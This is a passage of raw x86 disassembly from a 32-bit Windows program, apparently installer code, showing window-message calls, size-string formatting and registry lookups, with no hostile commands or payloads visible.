  40525d:	83 c4 10             	add    $0x10,%esp
  405260:	c2 10 00             	ret    $0x10
  405263:	56                   	push   %esi
  405264:	57                   	push   %edi
  405265:	bf 00 50 42 00       	mov    $0x425000,%edi
  40526a:	be d0 f5 41 00       	mov    $0x41f5d0,%esi
  40526f:	57                   	push   %edi
  405270:	56                   	push   %esi
  405271:	e8 52 15 00 00       	call   0x4067c8
  405276:	ff 74 24 10          	push   0x10(%esp)
  40527a:	57                   	push   %edi
  40527b:	e8 46 10 00 00       	call   0x4062c6
  405280:	ff 74 24 0c          	push   0xc(%esp)
  405284:	e8 aa c2 ff ff       	call   0x401533
  405289:	56                   	push   %esi
  40528a:	57                   	push   %edi
  40528b:	e8 38 15 00 00       	call   0x4067c8
  405290:	5f                   	pop    %edi
  405291:	5e                   	pop    %esi
  405292:	c2 08 00             	ret    $0x8
  405295:	a1 dc 37 42 00       	mov    0x4237dc,%eax
  40529a:	85 c0                	test   %eax,%eax
  40529c:	74 0f                	je     0x4052ad
  40529e:	6a 00                	push   $0x0
  4052a0:	6a 00                	push   $0x0
  4052a2:	ff 74 24 0c          	push   0xc(%esp)
  4052a6:	50                   	push   %eax
  4052a7:	ff 15 40 82 40 00    	call   *0x408240
  4052ad:	c2 04 00             	ret    $0x4
  4052b0:	6a 01                	push   $0x1
  4052b2:	ff 74 24 08          	push   0x8(%esp)
  4052b6:	6a 28                	push   $0x28
  4052b8:	ff 35 f8 37 42 00    	push   0x4237f8
  4052be:	ff 15 40 82 40 00    	call   *0x408240
  4052c4:	c2 04 00             	ret    $0x4
  4052c7:	ff 74 24 0c          	push   0xc(%esp)
  4052cb:	6a 00                	push   $0x0
  4052cd:	e8 33 09 00 00       	call   0x405c05
  4052d2:	50                   	push   %eax
  4052d3:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4052d7:	05 e8 03 00 00       	add    $0x3e8,%eax
  4052dc:	50                   	push   %eax
  4052dd:	ff 74 24 0c          	push   0xc(%esp)
  4052e1:	e8 d6 14 00 00       	call   0x4067bc
  4052e6:	c2 0c 00             	ret    $0xc
  4052e9:	83 3d cc 40 42 00 00 	cmpl   $0x0,0x4240cc
  4052f0:	a1 dc 05 42 00       	mov    0x4205dc,%eax
  4052f5:	0f 45 05 e0 05 42 00 	cmovne 0x4205e0,%eax
  4052fc:	6a 01                	push   $0x1
  4052fe:	6a 01                	push   $0x1
  405300:	68 f4 00 00 00       	push   $0xf4
  405305:	50                   	push   %eax
  405306:	ff 15 40 82 40 00    	call   *0x408240
  40530c:	c3                   	ret
  40530d:	8b 44 24 10          	mov    0x10(%esp),%eax
  405311:	83 ec 40             	sub    $0x40,%esp
  405314:	53                   	push   %ebx
  405315:	55                   	push   %ebp
  405316:	56                   	push   %esi
  405317:	57                   	push   %edi
  405318:	6a dc                	push   $0xffffffdc
  40531a:	5f                   	pop    %edi
  40531b:	85 c0                	test   %eax,%eax
  40531d:	74 0c                	je     0x40532b
  40531f:	8b 74 24 5c          	mov    0x5c(%esp),%esi
  405323:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  405327:	33 db                	xor    %ebx,%ebx
  405329:	eb 65                	jmp    0x405390
  40532b:	8b 54 24 5c          	mov    0x5c(%esp),%edx
  40532f:	b8 00 00 10 00       	mov    $0x100000,%eax
  405334:	8b f2                	mov    %edx,%esi
  405336:	bd 00 04 00 00       	mov    $0x400,%ebp
  40533b:	3b f0                	cmp    %eax,%esi
  40533d:	6a 14                	push   $0x14
  40533f:	1b c9                	sbb    %ecx,%ecx
  405341:	83 e1 f6             	and    $0xfffffff6,%ecx
  405344:	5b                   	pop    %ebx
  405345:	03 cb                	add    %ebx,%ecx
  405347:	3b f0                	cmp    %eax,%esi
  405349:	6a de                	push   $0xffffffde
  40534b:	1b c0                	sbb    %eax,%eax
  40534d:	f7 d8                	neg    %eax
  40534f:	03 f8                	add    %eax,%edi
  405351:	3b f5                	cmp    %ebp,%esi
  405353:	58                   	pop    %eax
  405354:	0f 42 f8             	cmovb  %eax,%edi
  405357:	33 db                	xor    %ebx,%ebx
  405359:	3b f5                	cmp    %ebp,%esi
  40535b:	0f 43 d9             	cmovae %ecx,%ebx
  40535e:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  405364:	73 10                	jae    0x405376
  405366:	33 c0                	xor    %eax,%eax
  405368:	8b cb                	mov    %ebx,%ecx
  40536a:	40                   	inc    %eax
  40536b:	d3 e0                	shl    %cl,%eax
  40536d:	6a 14                	push   $0x14
  40536f:	99                   	cltd
  405370:	59                   	pop    %ecx
  405371:	f7 f9                	idiv   %ecx
  405373:	8d 14 06             	lea    (%esi,%eax,1),%edx
  405376:	8b f2                	mov    %edx,%esi
  405378:	8b cb                	mov    %ebx,%ecx
  40537a:	81 e2 ff ff ff 00    	and    $0xffffff,%edx
  405380:	d3 ee                	shr    %cl,%esi
  405382:	6b c2 0a             	imul   $0xa,%edx,%eax
  405385:	33 d2                	xor    %edx,%edx
  405387:	6a 0a                	push   $0xa
  405389:	d3 e8                	shr    %cl,%eax
  40538b:	59                   	pop    %ecx
  40538c:	f7 f1                	div    %ecx
  40538e:	8b da                	mov    %edx,%ebx
  405390:	ff 74 24 58          	push   0x58(%esp)
  405394:	bd d0 f5 41 00       	mov    $0x41f5d0,%ebp
  405399:	55                   	push   %ebp
  40539a:	e8 66 08 00 00       	call   0x405c05
  40539f:	6a df                	push   $0xffffffdf
  4053a1:	8d 44 24 14          	lea    0x14(%esp),%eax
  4053a5:	50                   	push   %eax
  4053a6:	e8 5a 08 00 00       	call   0x405c05
  4053ab:	50                   	push   %eax
  4053ac:	57                   	push   %edi
  4053ad:	8d 44 24 38          	lea    0x38(%esp),%eax
  4053b1:	50                   	push   %eax
  4053b2:	e8 4e 08 00 00       	call   0x405c05
  4053b7:	50                   	push   %eax
  4053b8:	53                   	push   %ebx
  4053b9:	56                   	push   %esi
  4053ba:	68 24 85 40 00       	push   $0x408524
  4053bf:	55                   	push   %ebp
  4053c0:	e8 19 14 00 00       	call   0x4067de
  4053c5:	03 c5                	add    %ebp,%eax
  4053c7:	50                   	push   %eax
  4053c8:	ff 15 44 82 40 00    	call   *0x408244
  4053ce:	83 c4 18             	add    $0x18,%esp
  4053d1:	55                   	push   %ebp
  4053d2:	ff 74 24 58          	push   0x58(%esp)
  4053d6:	ff 35 dc 37 42 00    	push   0x4237dc
  4053dc:	e8 db 13 00 00       	call   0x4067bc
  4053e1:	5f                   	pop    %edi
  4053e2:	5e                   	pop    %esi
  4053e3:	5d                   	pop    %ebp
  4053e4:	5b                   	pop    %ebx
  4053e5:	83 c4 40             	add    $0x40,%esp
  4053e8:	c2 10 00             	ret    $0x10
  4053eb:	55                   	push   %ebp
  4053ec:	8b ec                	mov    %esp,%ebp
  4053ee:	ff 75 10             	push   0x10(%ebp)
  4053f1:	a1 e4 05 42 00       	mov    0x4205e4,%eax
  4053f6:	03 45 08             	add    0x8(%ebp),%eax
  4053f9:	50                   	push   %eax
  4053fa:	ff 75 0c             	push   0xc(%ebp)
  4053fd:	ff 15 88 80 40 00    	call   *0x408088
  405403:	ff 75 0c             	push   0xc(%ebp)
  405406:	ff 15 a0 80 40 00    	call   *0x4080a0
  40540c:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40540f:	01 05 e4 05 42 00    	add    %eax,0x4205e4
  405415:	89 01                	mov    %eax,(%ecx)
  405417:	33 c0                	xor    %eax,%eax
  405419:	5d                   	pop    %ebp
  40541a:	c2 10 00             	ret    $0x10
  40541d:	55                   	push   %ebp
  40541e:	8b ec                	mov    %esp,%ebp
  405420:	83 ec 38             	sub    $0x38,%esp
  405423:	57                   	push   %edi
  405424:	8b 3d 40 82 40 00    	mov    0x408240,%edi
  40542a:	6a 00                	push   $0x0
  40542c:	6a 09                	push   $0x9
  40542e:	68 0a 11 00 00       	push   $0x110a
  405433:	ff 75 08             	push   0x8(%ebp)
  405436:	ff d7                	call   *%edi
  405438:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40543c:	74 3e                	je     0x40547c
  40543e:	ff 15 f0 81 40 00    	call   *0x4081f0
  405444:	0f bf c8             	movswl %ax,%ecx
  405447:	c1 e8 10             	shr    $0x10,%eax
  40544a:	98                   	cwtl
  40544b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40544e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405451:	50                   	push   %eax
  405452:	ff 75 08             	push   0x8(%ebp)
  405455:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  405458:	ff 15 94 81 40 00    	call   *0x408194
  40545e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405461:	50                   	push   %eax
  405462:	6a 00                	push   $0x0
  405464:	68 11 11 00 00       	push   $0x1111
  405469:	ff 75 08             	push   0x8(%ebp)
  40546c:	ff d7                	call   *%edi
  40546e:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  405472:	75 05                	jne    0x405479
  405474:	83 c8 ff             	or     $0xffffffff,%eax
  405477:	eb 20                	jmp    0x405499
  405479:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40547c:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40547f:	8d 45 c8             	lea    -0x38(%ebp),%eax
  405482:	50                   	push   %eax
  405483:	6a 00                	push   $0x0
  405485:	68 0c 11 00 00       	push   $0x110c
  40548a:	ff 75 08             	push   0x8(%ebp)
  40548d:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  405494:	ff d7                	call   *%edi
  405496:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405499:	5f                   	pop    %edi
  40549a:	c9                   	leave
  40549b:	c2 08 00             	ret    $0x8
  40549e:	55                   	push   %ebp
  40549f:	8b ec                	mov    %esp,%ebp
  4054a1:	8b 45 08             	mov    0x8(%ebp),%eax
  4054a4:	83 ec 0c             	sub    $0xc,%esp
  4054a7:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  4054ac:	56                   	push   %esi
  4054ad:	83 f8 05             	cmp    $0x5,%eax
  4054b0:	0f 87 bb 00 00 00    	ja     0x405571
  4054b6:	6a eb                	push   $0xffffffeb
  4054b8:	ff 75 10             	push   0x10(%ebp)
  4054bb:	ff 15 74 82 40 00    	call   *0x408274
  4054c1:	8b f0                	mov    %eax,%esi
  4054c3:	85 f6                	test   %esi,%esi
  4054c5:	0f 84 a6 00 00 00    	je     0x405571
  4054cb:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  4054cf:	0f 87 9c 00 00 00    	ja     0x405571
  4054d5:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  4054d9:	0f 87 92 00 00 00    	ja     0x405571
  4054df:	8b 46 14             	mov    0x14(%esi),%eax
  4054e2:	a9 e0 ff ff ff       	test   $0xffffffe0,%eax
  4054e7:	0f 85 84 00 00 00    	jne    0x405571
  4054ed:	8b 0e                	mov    (%esi),%ecx
  4054ef:	a8 02                	test   $0x2,%al
  4054f1:	74 0c                	je     0x4054ff
  4054f3:	51                   	push   %ecx
  4054f4:	ff 15 90 81 40 00    	call   *0x408190
  4054fa:	8b c8                	mov    %eax,%ecx
  4054fc:	8b 46 14             	mov    0x14(%esi),%eax
  4054ff:	a8 01                	test   $0x1,%al
  405501:	74 0a                	je     0x40550d
  405503:	51                   	push   %ecx
  405504:	ff 75 0c             	push   0xc(%ebp)
  405507:	ff 15 54 80 40 00    	call   *0x408054
  40550d:	ff 76 10             	push   0x10(%esi)
  405510:	ff 75 0c             	push   0xc(%ebp)
  405513:	ff 15 58 80 40 00    	call   *0x408058
  405519:	8b 46 14             	mov    0x14(%esi),%eax
  40551c:	8b 4e 04             	mov    0x4(%esi),%ecx
  40551f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405522:	a8 08                	test   $0x8,%al
  405524:	74 0f                	je     0x405535
  405526:	51                   	push   %ecx
  405527:	ff 15 90 81 40 00    	call   *0x408190
  40552d:	8b c8                	mov    %eax,%ecx
  40552f:	8b 46 14             	mov    0x14(%esi),%eax
  405532:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405535:	a8 04                	test   $0x4,%al
  405537:	74 0d                	je     0x405546
  405539:	51                   	push   %ecx
  40553a:	ff 75 0c             	push   0xc(%ebp)
  40553d:	ff 15 4c 80 40 00    	call   *0x40804c
  405543:	8b 46 14             	mov    0x14(%esi),%eax
  405546:	a8 10                	test   $0x10,%al
  405548:	74 22                	je     0x40556c
  40554a:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
  40554e:	8b 46 08             	mov    0x8(%esi),%eax
  405551:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405554:	74 09                	je     0x40555f
  405556:	ff 76 0c             	push   0xc(%esi)
  405559:	ff 15 60 80 40 00    	call   *0x408060
  40555f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405562:	50                   	push   %eax
  405563:	ff 15 50 80 40 00    	call   *0x408050
  405569:	89 46 0c             	mov    %eax,0xc(%esi)
  40556c:	8b 46 0c             	mov    0xc(%esi),%eax
  40556f:	eb 02                	jmp    0x405573
  405571:	33 c0                	xor    %eax,%eax
  405573:	5e                   	pop    %esi
  405574:	c9                   	leave
  405575:	c2 0c 00             	ret    $0xc
  405578:	8b 0d 2c 40 42 00    	mov    0x42402c,%ecx
  40557e:	33 c0                	xor    %eax,%eax
  405580:	8b 15 28 40 42 00    	mov    0x424028,%edx
  405586:	85 c9                	test   %ecx,%ecx
  405588:	74 1a                	je     0x4055a4
  40558a:	56                   	push   %esi
  40558b:	8b 74 24 08          	mov    0x8(%esp),%esi
  40558f:	49                   	dec    %ecx
  405590:	f6 42 08 01          	testb  $0x1,0x8(%edx)
  405594:	74 03                	je     0x405599
  405596:	03 04 b2             	add    (%edx,%esi,4),%eax
  405599:	81 c2 18 04 00 00    	add    $0x418,%edx
  40559f:	85 c9                	test   %ecx,%ecx
  4055a1:	75 ec                	jne    0x40558f
  4055a3:	5e                   	pop    %esi
  4055a4:	c2 04 00             	ret    $0x4
  4055a7:	56                   	push   %esi
  4055a8:	8b 35 28 40 42 00    	mov    0x424028,%esi
  4055ae:	57                   	push   %edi
  4055af:	8b 3d 2c 40 42 00    	mov    0x42402c,%edi
  4055b5:	6a 00                	push   $0x0
  4055b7:	ff 15 84 82 40 00    	call   *0x408284
  4055bd:	09 05 60 40 42 00    	or     %eax,0x424060
  4055c3:	6a 00                	push   $0x0
  4055c5:	e8 cb fc ff ff       	call   0x405295
  4055ca:	85 ff                	test   %edi,%edi
  4055cc:	74 2b                	je     0x4055f9
  4055ce:	83 c6 0c             	add    $0xc,%esi
  4055d1:	4f                   	dec    %edi
  4055d2:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  4055d6:	74 0f                	je     0x4055e7
  4055d8:	ff 74 24 0c          	push   0xc(%esp)
  4055dc:	ff 36                	push   (%esi)
  4055de:	e8 b6 bd ff ff       	call   0x401399
  4055e3:	85 c0                	test   %eax,%eax
  4055e5:	75 0c                	jne    0x4055f3
  4055e7:	81 c6 18 04 00 00    	add    $0x418,%esi
  4055ed:	85 ff                	test   %edi,%edi
  4055ef:	75 e0                	jne    0x4055d1
  4055f1:	eb 06                	jmp    0x4055f9
  4055f3:	ff 05 cc 40 42 00    	incl   0x4240cc
  4055f9:	68 04 04 00 00       	push   $0x404
  4055fe:	e8 92 fc ff ff       	call   0x405295
  405603:	ff 15 7c 82 40 00    	call   *0x40827c
  405609:	a1 cc 40 42 00       	mov    0x4240cc,%eax
  40560e:	5f                   	pop    %edi
  40560f:	5e                   	pop    %esi
  405610:	c2 04 00             	ret    $0x4
  405613:	55                   	push   %ebp
  405614:	8b ec                	mov    %esp,%ebp
  405616:	56                   	push   %esi
  405617:	8b 75 14             	mov    0x14(%ebp),%esi
  40561a:	57                   	push   %edi
  40561b:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40561e:	8b c7                	mov    %edi,%eax
  405620:	81 ff 02 01 00 00    	cmp    $0x102,%edi
  405626:	75 14                	jne    0x40563c
  405628:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  40562c:	75 53                	jne    0x405681
  40562e:	68 13 04 00 00       	push   $0x413
  405633:	e8 5d fc ff ff       	call   0x405295
  405638:	33 c0                	xor    %eax,%eax
  40563a:	eb 59                	jmp    0x405695
  40563c:	81 ff 00 02 00 00    	cmp    $0x200,%edi
  405642:	75 20                	jne    0x405664
  405644:	ff 75 08             	push   0x8(%ebp)
  405647:	ff 15 d8 81 40 00    	call   *0x4081d8
  40564d:	85 c0                	test   %eax,%eax
  40564f:	74 30                	je     0x405681
  405651:	6a 01                	push   $0x1
  405653:	ff 75 08             	push   0x8(%ebp)
  405656:	e8 c2 fd ff ff       	call   0x40541d
  40565b:	8b f0                	mov    %eax,%esi
  40565d:	bf 19 04 00 00       	mov    $0x419,%edi
  405662:	eb 07                	jmp    0x40566b
  405664:	3d 19 04 00 00       	cmp    $0x419,%eax
  405669:	75 16                	jne    0x405681
  40566b:	39 35 f0 0d 42 00    	cmp    %esi,0x420df0
  405671:	74 0e                	je     0x405681
  405673:	56                   	push   %esi
  405674:	6a 06                	push   $0x6
  405676:	89 35 f0 0d 42 00    	mov    %esi,0x420df0
  40567c:	e8 e2 fb ff ff       	call   0x405263
  405681:	56                   	push   %esi
  405682:	ff 75 10             	push   0x10(%ebp)
  405685:	57                   	push   %edi
  405686:	ff 75 08             	push   0x8(%ebp)
  405689:	ff 35 ec 05 42 00    	push   0x4205ec
  40568f:	ff 15 6c 82 40 00    	call   *0x40826c
  405695:	5f                   	pop    %edi
  405696:	5e                   	pop    %esi
  405697:	5d                   	pop    %ebp
  405698:	c2 10 00             	ret    $0x10
  40569b:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  4056a0:	75 06                	jne    0x4056a8
  4056a2:	ff 05 ec 37 42 00    	incl   0x4237ec
  4056a8:	6a 00                	push   $0x0
  4056aa:	ff 74 24 08          	push   0x8(%esp)
  4056ae:	68 08 04 00 00       	push   $0x408
  4056b3:	ff 35 f8 37 42 00    	push   0x4237f8
  4056b9:	ff 15 40 82 40 00    	call   *0x408240
  4056bf:	c2 04 00             	ret    $0x4
  4056c2:	53                   	push   %ebx
  4056c3:	55                   	push   %ebp
  4056c4:	56                   	push   %esi
  4056c5:	57                   	push   %edi
  4056c6:	68 00 b0 42 00       	push   $0x42b000
  4056cb:	bf ff ff 00 00       	mov    $0xffff,%edi
  4056d0:	e8 09 12 00 00       	call   0x4068de
  4056d5:	8b 1d 10 40 42 00    	mov    0x424010,%ebx
  4056db:	8b 35 40 40 42 00    	mov    0x424040,%esi
  4056e1:	0f b7 e8             	movzwl %ax,%ebp
  4056e4:	8b 15 44 40 42 00    	mov    0x424044,%edx
  4056ea:	85 d2                	test   %edx,%edx
  4056ec:	74 35                	je     0x405723
  4056ee:	8b 4b 64             	mov    0x64(%ebx),%ecx
  4056f1:	0f af ca             	imul   %edx,%ecx
  4056f4:	2b 4b 64             	sub    0x64(%ebx),%ecx
  4056f7:	4a                   	dec    %edx
  4056f8:	66 8b 04 31          	mov    (%ecx,%esi,1),%ax
  4056fc:	66 33 c5             	xor    %bp,%ax
  4056ff:	66 85 c7             	test   %ax,%di
  405702:	74 06                	je     0x40570a
  405704:	85 d2                	test   %edx,%edx
  405706:	75 ec                	jne    0x4056f4
  405708:	eb 19                	jmp    0x405723
  40570a:	8b 44 31 02          	mov    0x2(%ecx,%esi,1),%eax
  40570e:	a3 d4 37 42 00       	mov    %eax,0x4237d4
  405713:	8b 44 31 06          	mov    0x6(%ecx,%esi,1),%eax
  405717:	a3 e8 40 42 00       	mov    %eax,0x4240e8
  40571c:	8d 46 0a             	lea    0xa(%esi),%eax
  40571f:	03 c1                	add    %ecx,%eax
  405721:	75 17                	jne    0x40573a
  405723:	33 c9                	xor    %ecx,%ecx
  405725:	ba ff ff 00 00       	mov    $0xffff,%edx
  40572a:	66 3b fa             	cmp    %dx,%di
  40572d:	b8 ff 03 00 00       	mov    $0x3ff,%eax
  405732:	0f 45 c1             	cmovne %ecx,%eax
  405735:	0f b7 f8             	movzwl %ax,%edi
  405738:	eb aa                	jmp    0x4056e4
  40573a:	a3 e0 37 42 00       	mov    %eax,0x4237e0
  40573f:	0f b7 04 31          	movzwl (%ecx,%esi,1),%eax
  405743:	50                   	push   %eax
  405744:	68 00 b0 42 00       	push   $0x42b000
  405749:	e8 78 0b 00 00       	call   0x4062c6
  40574e:	e8 f0 02 00 00       	call   0x405a43
  405753:	8b 35 28 40 42 00    	mov    0x424028,%esi
  405759:	8b 3d 2c 40 42 00    	mov    0x42402c,%edi
  40575f:	eb 17                	jmp    0x405778
  405761:	4f                   	dec    %edi
  405762:	83 3e 00             	cmpl   $0x0,(%esi)
  405765:	74 0b                	je     0x405772
  405767:	ff 36                	push   (%esi)
  405769:	8d 46 18             	lea    0x18(%esi),%eax
  40576c:	50                   	push   %eax
  40576d:	e8 93 04 00 00       	call   0x405c05
  405772:	81 c6 18 04 00 00    	add    $0x418,%esi
  405778:	85 ff                	test   %edi,%edi
  40577a:	75 e5                	jne    0x405761
  40577c:	5f                   	pop    %edi
  40577d:	5e                   	pop    %esi
  40577e:	5d                   	pop    %ebp
  40577f:	5b                   	pop    %ebx
  405780:	c3                   	ret
  405781:	83 ec 10             	sub    $0x10,%esp
  405784:	53                   	push   %ebx
  405785:	55                   	push   %ebp
  405786:	56                   	push   %esi
  405787:	57                   	push   %edi
  405788:	8b 3d 10 40 42 00    	mov    0x424010,%edi
  40578e:	6a 02                	push   $0x2
  405790:	e8 0e 0e 00 00       	call   0x4065a3
  405795:	33 db                	xor    %ebx,%ebx
  405797:	85 c0                	test   %eax,%eax
  405799:	74 12                	je     0x4057ad
  40579b:	ff d0                	call   *%eax
  40579d:	0f b7 c0             	movzwl %ax,%eax
  4057a0:	50                   	push   %eax
  4057a1:	68 00 b0 42 00       	push   $0x42b000
  4057a6:	e8 1b 0b 00 00       	call   0x4062c6
  4057ab:	eb 4f                	jmp    0x4057fc
  4057ad:	53                   	push   %ebx
  4057ae:	be d0 f5 41 00       	mov    $0x41f5d0,%esi
  4057b3:	66 c7 05 00 b0 42 00 	movw   $0x7830,0x42b000
  4057ba:	30 78 
  4057bc:	56                   	push   %esi
  4057bd:	53                   	push   %ebx
  4057be:	68 98 84 40 00       	push   $0x408498
  4057c3:	68 01 00 00 80       	push   $0x80000001
  4057c8:	88 1d 02 b0 42 00    	mov    %bl,0x42b002
  4057ce:	e8 61 0e 00 00       	call   0x406634
  4057d3:	38 1d d0 f5 41 00    	cmp    %bl,0x41f5d0
  4057d9:	75 16                	jne    0x4057f1
  4057db:	53                   	push   %ebx
  4057dc:	56                   	push   %esi
  4057dd:	68 b6 84 40 00       	push   $0x4084b6
  4057e2:	68 c0 84 40 00       	push   $0x4084c0
  4057e7:	68 03 00 00 80       	push   $0x80000003
  4057ec:	e8 43 0e 00 00       	call   0x406634
  4057f1:	56                   	push   %esi
  4057f2:	68 00 b0 42 00       	push   $0x42b000
  4057f7:	e8 c6 0f 00 00       	call   0x4067c2
  4057fc:	e8 c1 fe ff ff       	call   0x4056c2
  405801:	a1 0c 40 42 00       	mov    0x42400c,%eax
  405806:	bd 00 a4 42 00       	mov    $0x42a400,%ebp
  40580b:	83 e0 20             	and    $0x20,%eax
  40580e:	c7 05 dc 40 42 00 00 	movl   $0x10000,0x4240dc
  405815:	00 01 00 
  405818:	55                   	push   %ebp
  405819:	a3 c0 40 42 00       	mov    %eax,0x4240c0
  40581e:	e8 bc 0a 00 00       	call   0x4062df
  405823:	85 c0                	test   %eax,%eax
  405825:	0f 85 84 00 00 00    	jne    0x4058af
  40582b:	8b 57 48             	mov    0x48(%edi),%edx
  40582e:	85 d2                	test   %edx,%edx
  405830:	74 7d                	je     0x4058af
  405832:	8b 0d 38 40 42 00    	mov    0x424038,%ecx
  405838:	be a0 2f 42 00       	mov    $0x422fa0,%esi
  40583d:	8b 47 4c             	mov    0x4c(%edi),%eax
  405840:	53                   	push   %ebx
  405841:	56                   	push   %esi
  405842:	03 c1                	add    %ecx,%eax
  405844:	50                   	push   %eax
  405845:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  405848:	50                   	push   %eax
  405849:	ff 77 44             	push   0x44(%edi)
  40584c:	e8 e3 0d 00 00       	call   0x406634
  405851:	a0 a0 2f 42 00       	mov    0x422fa0,%al
  405856:	84 c0                	test   %al,%al
  405858:	74 55                	je     0x4058af
  40585a:	3c 22                	cmp    $0x22,%al
  40585c:	75 0f                	jne    0x40586d
  40585e:	6a 22                	push   $0x22
  405860:	be a1 2f 42 00       	mov    $0x422fa1,%esi
  405865:	56                   	push   %esi
  405866:	e8 37 0a 00 00       	call   0x4062a2
  40586b:	88 18                	mov    %bl,(%eax)
  40586d:	56                   	push   %esi
  40586e:	e8 6b 0f 00 00       	call   0x4067de
  405873:	83 c0 fc             	add    $0xfffffffc,%eax
  405876:	03 c6                	add    %esi,%eax
  405878:	3b c6                	cmp    %esi,%eax
  40587a:	76 26                	jbe    0x4058a2
  40587c:	68 18 85 40 00       	push   $0x408518
  405881:	50                   	push   %eax
  405882:	ff 15 e0 80 40 00    	call   *0x4080e0
  405888:	85 c0                	test   %eax,%eax
  40588a:	75 16                	jne    0x4058a2
  40588c:	56                   	push   %esi
  40588d:	ff 15 1c 81 40 00    	call   *0x40811c
  405893:	83 f8 ff             	cmp    $0xffffffff,%eax
  405896:	74 04                	je     0x40589c
  405898:	a8 10                	test   $0x10,%al
  40589a:	75 06                	jne    0x4058a2
  40589c:	56                   	push   %esi
  40589d:	e8 de 10 00 00       	call   0x406980
  4058a2:	56                   	push   %esi
  4058a3:	e8 5c 09 00 00       	call   0x406204
  4058a8:	50                   	push   %eax
  4058a9:	55                   	push   %ebp
  4058aa:	e8 19 0f 00 00       	call   0x4067c8
  4058af:	55                   	push   %ebp
  4058b0:	e8 2a 0a 00 00       	call   0x4062df
  4058b5:	85 c0                	test   %eax,%eax
  4058b7:	75 0c                	jne    0x4058c5
  4058b9:	ff b7 18 01 00 00    	push   0x118(%edi)
  4058bf:	55                   	push   %ebp
  4058c0:	e8 40 03 00 00       	call   0x405c05
  4058c5:	68 40 80 00 00       	push   $0x8040
  4058ca:	53                   	push   %ebx
  4058cb:	53                   	push   %ebx
  4058cc:	6a 01                	push   $0x1
  4058ce:	6a 67                	push   $0x67
  4058d0:	ff 35 f4 37 42 00    	push   0x4237f4
  4058d6:	ff 15 0c 82 40 00    	call   *0x40820c
  4058dc:	8b c8                	mov    %eax,%ecx
  4058de:	bd a0 37 42 00       	mov    $0x4237a0,%ebp
  4058e3:	89 0d d8 37 42 00    	mov    %ecx,0x4237d8
  4058e9:	83 7f 50 ff          	cmpl   $0xffffffff,0x50(%edi)
  4058ed:	8b 3d e8 81 40 00    	mov    0x4081e8,%edi
  4058f3:	74 7d                	je     0x405972
  4058f5:	a1 f4 37 42 00       	mov    0x4237f4,%eax
  4058fa:	be 20 85 40 00       	mov    $0x408520,%esi
  4058ff:	55                   	push   %ebp
  405900:	c7 05 a4 37 42 00 00 	movl   $0x401000,0x4237a4
  405907:	10 40 00 
  40590a:	a3 b0 37 42 00       	mov    %eax,0x4237b0
  40590f:	89 0d b4 37 42 00    	mov    %ecx,0x4237b4
  405915:	89 35 c4 37 42 00    	mov    %esi,0x4237c4
  40591b:	ff d7                	call   *%edi
  40591d:	66 85 c0             	test   %ax,%ax
  405920:	75 07                	jne    0x405929
  405922:	33 c0                	xor    %eax,%eax
  405924:	e9 06 01 00 00       	jmp    0x405a2f
  405929:	53                   	push   %ebx
  40592a:	8d 44 24 14          	lea    0x14(%esp),%eax
  40592e:	50                   	push   %eax
  40592f:	53                   	push   %ebx
  405930:	6a 30                	push   $0x30
  405932:	ff 15 84 81 40 00    	call   *0x408184
  405938:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40593c:	2b 44 24 14          	sub    0x14(%esp),%eax
  405940:	53                   	push   %ebx
  405941:	ff 35 f4 37 42 00    	push   0x4237f4
  405947:	53                   	push   %ebx
  405948:	53                   	push   %ebx
  405949:	50                   	push   %eax
  40594a:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40594e:	2b 44 24 24          	sub    0x24(%esp),%eax
  405952:	50                   	push   %eax
  405953:	ff 74 24 2c          	push   0x2c(%esp)
  405957:	ff 74 24 2c          	push   0x2c(%esp)
  40595b:	68 00 00 00 80       	push   $0x80000000
  405960:	53                   	push   %ebx
  405961:	56                   	push   %esi
  405962:	68 80 00 00 00       	push   $0x80
  405967:	ff 15 e0 81 40 00    	call   *0x4081e0
  40596d:	a3 d8 05 42 00       	mov    %eax,0x4205d8
  405972:	53                   	push   %ebx
  405973:	e8 bb bb ff ff       	call   0x401533
  405978:	85 c0                	test   %eax,%eax
  40597a:	0f 85 ac 00 00 00    	jne    0x405a2c
  405980:	e8 3d fd ff ff       	call   0x4056c2
  405985:	39 1d e0 40 42 00    	cmp    %ebx,0x4240e0
  40598b:	0f 85 82 00 00 00    	jne    0x405a13
  405991:	6a 05                	push   $0x5
  405993:	ff 35 d8 05 42 00    	push   0x4205d8
  405999:	ff 15 30 82 40 00    	call   *0x408230
  40599f:	68 e8 84 40 00       	push   $0x4084e8
  4059a4:	e8 5f 05 00 00       	call   0x405f08
  4059a9:	85 c0                	test   %eax,%eax
  4059ab:	75 0a                	jne    0x4059b7
  4059ad:	68 f4 84 40 00       	push   $0x4084f4
  4059b2:	e8 51 05 00 00       	call   0x405f08
  4059b7:	8b 35 e4 81 40 00    	mov    0x4081e4,%esi
  4059bd:	55                   	push   %ebp
  4059be:	68 00 85 40 00       	push   $0x408500
  4059c3:	53                   	push   %ebx
  4059c4:	ff d6                	call   *%esi
